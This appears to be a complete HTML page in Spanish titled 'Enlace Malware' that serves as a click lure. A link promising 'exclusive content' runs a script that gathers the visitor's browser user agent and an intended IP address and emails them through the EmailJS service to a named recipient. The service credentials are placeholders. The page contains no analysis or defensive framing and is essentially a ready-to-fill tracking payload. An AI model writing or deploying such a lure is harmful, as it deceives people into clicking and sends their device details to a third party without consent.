<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enlace Malware</title>
</head>
<body>

<a href="#" id="malwareLink">Haz clic aquí para ver contenido exclusivo</a>

<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
<script>
document.getElementById('malwareLink').addEventListener('click', function(event) {
    event.preventDefault();
    
    // Obtener información del dispositivo
    var userAgent = navigator.userAgent;
    var ipAddress = 'Obtenida desde el servidor'; // Necesitarás una API para obtener la IP

    // Enviar información al correo electrónico
    emailjs.init('YOUR_USER_ID');
    emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', {
        from_name: 'Información del Dispositivo',
        to_name: 'Carlos Mendoza',
        message: `User Agent: ${userAgent}\nIP Address: ${ipAddress}`
    }, 'YOUR_USER_ID')
    .then(function(response) {
        console.log('Email enviado correctamente:', response.status);
    }, function(error) {
        console.log('Error al enviar el email:', error);
    });
});
</script>

</body>
</html>
